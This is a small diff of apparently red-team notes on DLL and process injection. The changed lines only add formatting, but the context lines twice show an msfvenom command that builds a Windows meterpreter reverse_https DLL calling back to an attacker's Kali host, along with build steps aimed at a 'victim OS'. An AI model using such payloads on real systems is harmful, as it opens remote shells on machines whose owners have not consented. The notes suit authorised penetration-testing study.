@@ -42,7 +42,7 @@ namespace Inject
 ```
 5. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
 6. Click Build -> Build Solution
-7. Find the .exe in <project folder>/bin/x64/Release and run it
+7. Find the .exe in `<project folder>/bin/x64/Release` and run it
 
 ## DLL (saved to disk)
 1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<lport> -f dll -o met.dll`
@@ -102,7 +102,7 @@ namespace Inject
 ```
 5. Make sure the dropdowns on the left of 'Start' at the top bar is set to 'Release' and 'x64' (or other depending on victim OS)
 6. Click Build -> Build Solution
-7. Find the .exe in <project folder>/bin/x64/Release and run it
+7. Find the .exe in `<project folder>/bin/x64/Release` and run it
 
 ## DLL (reflective)
 1. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali ip> LPORT=<lport> -f dll -o met.dll`
